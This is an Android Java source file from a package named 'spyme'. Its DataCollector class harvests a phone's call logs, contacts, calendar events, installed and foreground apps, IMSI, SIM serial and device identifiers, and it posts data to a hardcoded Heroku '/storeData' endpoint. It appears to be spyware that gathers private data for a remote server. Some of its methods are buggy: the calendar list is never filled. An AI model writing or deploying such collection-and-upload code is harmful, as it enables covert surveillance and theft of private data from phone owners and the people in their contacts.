package bouzid.spyme.mosaic.bouzid;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.Application;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.SortedMap;
import java.util.TreeMap;
import java.util.UUID;

import static android.content.ContentValues.TAG;
import static android.content.Context.BATTERY_SERVICE;

public class DataCollector {

    private String serverUri;
    private Activity activity;
    private String imsi;

    public ArrayList<MobilityInfo> getMobilityInfos() {
        return mobilityInfos;
    }

    private ArrayList<MobilityInfo> mobilityInfos;

    public DataCollector(String server, Activity activity) {
        serverUri = server;
        this.activity = activity;
        mobilityInfos = new ArrayList<>();
        imsi = get(activity.getApplicationContext(), "android.telephony.TelephonyProperties.PROPERTY_IMSI");
    }

    public ArrayList<CallLogInfo> getCallLogs() {


        Cursor cursor = activity.managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);

        ArrayList<CallLogInfo> callLogInfos = new ArrayList<>();

        int idxNumber = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int idxDuration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        int idxDate = cursor.getColumnIndex(CallLog.Calls.DATE);
        int idxDataUsage = -1;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            idxDataUsage = cursor.getColumnIndex(CallLog.Calls.DATA_USAGE);
        }
        int idxType = cursor.getColumnIndex(CallLog.Calls.TYPE);
        while (cursor.moveToNext()) {

            String number = cursor.getString(idxNumber);
            int duration = cursor.getInt(idxDuration);
            String date = cursor.getString(idxDate);
            String dataUsage = "";
            if (idxDataUsage != -1)
                dataUsage = cursor.getString(idxDataUsage);
            String type = cursor.getString(idxType);

            CallLogInfo callLogInfo = new CallLogInfo(number, type, date, dataUsage, duration);
            callLogInfos.add(callLogInfo);

        }

        return callLogInfos;
    }

    public ArrayList<CalendarInfo> getCalendarInfos() {
        ArrayList<CalendarInfo> calendarInfos = new ArrayList<>();
        Cursor cursor = activity.getApplicationContext().getContentResolver()
                .query(
                        Uri.parse("content://com.android.calendar/events"),
                        new String[]{"calendar_id", "title", "description",
                                "dtstart", "dtend", "eventLocation"}, null,
                        null, null);
        cursor.moveToFirst();
        // fetching calendars name
        String CNames[] = new String[cursor.getCount()];

        // fetching calendars id
        for (int i = 0; i < CNames.length; i++) {
            CalendarInfo calendarInfo = new CalendarInfo(
                    cursor.getString(1),
                    cursor.getString(2),
                    cursor.getString(3),
                    cursor.getString(4)

            );
            cursor.moveToNext();

        }
        cursor.close();
        return calendarInfos;
    }

    public ArrayList<ContactInfo> getContactInfos() {
        ArrayList<ContactInfo> contactInfos = new ArrayList<>();
        ContentResolver cr = activity.getApplicationContext().getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {

                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));
                List<String> phoneNumbers = new ArrayList<>();
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        phoneNumbers.add(phoneNo);
                    }
                    pCur.close();
                }
                contactInfos.add(new ContactInfo(phoneNumbers, name));
            }
        }
        if (cur != null) {
            cur.close();
        }
        return contactInfos;
    }

    public static String get(Context context, String key) {
        String ret = "";

        try {
            ClassLoader cl = context.getClassLoader();
            @SuppressWarnings("rawtypes")
            Class SystemProperties = cl.loadClass("android.os.SystemProperties");

            //Parameters Types
            @SuppressWarnings("rawtypes")
            Class[] paramTypes = new Class[1];
            paramTypes[0] = String.class;

            Method get = SystemProperties.getMethod("get", paramTypes);

            //Parameters
            Object[] params = new Object[1];
            params[0] = new String(key);

            ret = (String) get.invoke(SystemProperties, params);
        } catch (Exception e) {
            ret = "";
            //TODO : Error handling
        }

        return ret;
    }

    @SuppressLint("MissingPermission")
    public String getImsi() {


        String uniqueID = null;
         String PREF_UNIQUE_ID = "PREF_UNIQUE_ID";


                SharedPreferences sharedPrefs = activity.getApplicationContext().getSharedPreferences(
                        PREF_UNIQUE_ID, Context.MODE_PRIVATE);
                uniqueID = sharedPrefs.getString(PREF_UNIQUE_ID, null);
                if (uniqueID == null) {
                    uniqueID = UUID.randomUUID().toString();
                    SharedPreferences.Editor editor = sharedPrefs.edit();
                    editor.putString(PREF_UNIQUE_ID, uniqueID);
                    editor.commit();

                }

        imsi = get(activity.getApplicationContext(), "android.telephony.TelephonyProperties.PROPERTY_IMSI");
         String android_id = Settings.Secure.getString(activity.getContentResolver(),
                Settings.Secure.ANDROID_ID);

        final TelephonyManager tm = (TelephonyManager) activity.getSystemService(Context.TELEPHONY_SERVICE);

        final String tmDevice, tmSerial, androidId;
        tmDevice = "" + tm.getDeviceId();
        tmSerial = "" + tm.getSimSerialNumber();
        androidId = "" + android.provider.Settings.Secure.getString(activity.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);

        UUID deviceUuid = new UUID(androidId.hashCode(), ((long)tmDevice.hashCode() << 32) | tmSerial.hashCode());
        String deviceId = deviceUuid.toString();




        return "IMSI "+deviceId;
            //return uniqueID;

    }

    public void getFForegroung(){


        if (Build.VERSION.SDK_INT >= 21) {
            String currentApp = null;
            UsageStatsManager usm = (UsageStatsManager)  activity.getApplicationContext().getSystemService(Context.USAGE_STATS_SERVICE);
            long time = System.currentTimeMillis();
            List<UsageStats> applist = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 1000, time);
            if (applist != null && applist.size() > 0) {
                SortedMap<Long, UsageStats> mySortedMap = new TreeMap<Long, UsageStats>();
                for (UsageStats usageStats : applist) {
                    mySortedMap.put(usageStats.getLastTimeUsed(), usageStats);

                }
                if (mySortedMap != null && !mySortedMap.isEmpty()) {
                    currentApp = mySortedMap.get(mySortedMap.lastKey()).getPackageName();
                    Log.i("LASSSTTTTTTT", currentApp);
                }
            }
    }
    }

    public ArrayList<ApplicationInfo> getInstalledApps() {

        ArrayList<ApplicationInfo> applicationInfos = new ArrayList<>();
        List<PackageInfo> packs = activity.getApplicationContext().getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if (p == null) {
                continue;
            }

            String appname = p.applicationInfo.loadLabel(activity.getApplicationContext().getPackageManager()).toString();
            String pname = p.packageName;
            String versionName = p.versionName;
            String versionCode = p.versionCode + "";

            applicationInfos.add(new ApplicationInfo(appname, pname, versionName, versionCode));

        }

        return applicationInfos;
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public BatteryStats getBatteryStats() {
        BatteryManager bm = (BatteryManager) activity.getApplicationContext().getSystemService(BATTERY_SERVICE);

        int cold = bm.getIntProperty(BatteryManager.BATTERY_HEALTH_COLD);
        int dead = bm.getIntProperty(BatteryManager.BATTERY_HEALTH_DEAD);
        int good = bm.getIntProperty(BatteryManager.BATTERY_HEALTH_GOOD);
        int overheat = bm.getIntProperty(BatteryManager.BATTERY_HEALTH_OVERHEAT);
        int voltage = bm.getIntProperty(BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE);
        int health_unknown = bm.getIntProperty(BatteryManager.BATTERY_HEALTH_UNKNOWN);
        int failure = bm.getIntProperty(BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE);
        int ac = bm.getIntProperty(BatteryManager.BATTERY_PLUGGED_AC);
        int usb = bm.getIntProperty(BatteryManager.BATTERY_PLUGGED_USB);
        int wireless = bm.getIntProperty(BatteryManager.BATTERY_PLUGGED_WIRELESS);
        int capacity = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        int counter = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CHARGE_COUNTER);
        int average = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_AVERAGE);
        int now = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_NOW);
        int status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS);
        int charging = bm.getIntProperty(BatteryManager.BATTERY_STATUS_CHARGING);
        int discharging = bm.getIntProperty(BatteryManager.BATTERY_STATUS_DISCHARGING);
        int full = bm.getIntProperty(BatteryManager.BATTERY_STATUS_FULL);
        int status_unknown = bm.getIntProperty(BatteryManager.BATTERY_STATUS_UNKNOWN);

        BatteryStats batteryStats = new BatteryStats(
                cold, dead, good, overheat, voltage,
                health_unknown, failure, ac, usb, wireless,
                capacity, counter, average, now,
                status, charging, discharging, full, status_unknown
        );

        return batteryStats;

    }

    public HardwareInfo getHardware() {


        // ram info
        long totalMemory = -1;
        long avalaibleMemory = -1;
        try {
            Process process = Runtime.getRuntime().exec("cat /proc/meminfo");
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                if (line.contains("MemTotal"))
                    totalMemory = Long.parseLong(line.substring(line.indexOf(":") + 1, line.length()).replace("kB", "").trim());
                else if (line.contains("MemFree"))
                    avalaibleMemory = Long.parseLong(line.substring(line.indexOf(":") + 1, line.length()).replace("kB", "").trim());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        // cpu infos
        int cores = -1;
        String cpuModelName = "";
        float cpuMhz = -1;

        try {
            Process process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                if (line.contains("cpu cores"))
                    cores = Integer.parseInt(line.substring(line.indexOf(":") + 1, line.length()).trim());
                else if (line.contains("model name"))
                    cpuModelName = line.substring(line.indexOf(":") + 1, line.length()).trim();
                else if (line.contains("cpu MHz"))
                    cpuMhz = Float.parseFloat(line.substring(line.indexOf(":") + 1, line.length()).trim());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        return new HardwareInfo(totalMemory, avalaibleMemory, cores, cpuModelName, cpuMhz, Build.MODEL, Build.BRAND);

    }





//Store Data
public void sendGetRequest(String url){



    RequestQueue ExampleRequestQueue = Volley.newRequestQueue(activity.getApplicationContext());



    StringRequest ExampleStringRequest = new StringRequest(Request.Method.GET, url, new Response.Listener<String>() {
        @Override
        public void onResponse(String response) {
            Log.d("AAAAAAAAAA",response);
            //This code is executed if the server responds, whether or not the response contains data.
            //The String 'response' contains the server's response.
        }
    }, new Response.ErrorListener() { //Create an error listener to handle errors appropriately.
        @Override
        public void onErrorResponse(VolleyError error) {
            //This code is executed if there is an error.
        }
    }) {
        protected Map<String, String> getParams() {
            Map<String, String> MyData = new HashMap<String, String>();
            MyData.put("aa", "11"); //Add the data you'd like to send to the server.
            MyData.put("bb", "22"); //Add the data you'd like to send to the server.
            return MyData;
        }
    };
    ExampleRequestQueue.add(ExampleStringRequest);

}

    public  void SendPostRequest( String url,String msg ){
        final String msgg=msg;
        url="https://radiant-cliffs-98969.herokuapp.com/storeData";

        RequestQueue queue = Volley.newRequestQueue(activity.getApplicationContext());
        StringRequest postRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>()
                {
                    @Override
                    public void onResponse(String response) {
                        // response
                        Log.d("WWWWWWWWWWWWWWWW", response);
                    }
                },
                new Response.ErrorListener()
                {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // error
                        Log.d("Error.Response", String.valueOf(error));
                    }
                }
        ) {
            @Override
            protected Map<String, String> getParams()
            {
                Map<String, String>  params = new HashMap<String, String>();
                params.put("username", msgg);
                params.put("password", "");

                return params;
            }
        };
        queue.add(postRequest);
    }




}
